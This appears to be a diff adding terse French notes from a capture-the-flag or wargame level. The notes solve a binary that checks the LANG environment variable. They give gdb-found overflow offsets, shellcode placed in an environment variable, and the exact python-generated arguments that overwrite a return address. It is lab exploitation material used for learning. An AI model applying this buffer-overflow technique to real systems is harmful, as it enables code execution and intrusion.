@@ -1,0 +1,10 @@
+getenv("LANG")
+comparaison avec nl ou fi
+test avec nl
+donc -> export LANG="nl"
+
+
+gdb segfault avec premier arg de 40 charaacter et deuxieme segfault a parti du 24eme
+export de shellcode dans une var existante en dessous du prog et appel de notre shellcode
+args -> `python -c "print 'B'*40"` `python -c "print 'C'*23 + '\xc2\xff\xff\xbf'"`
+
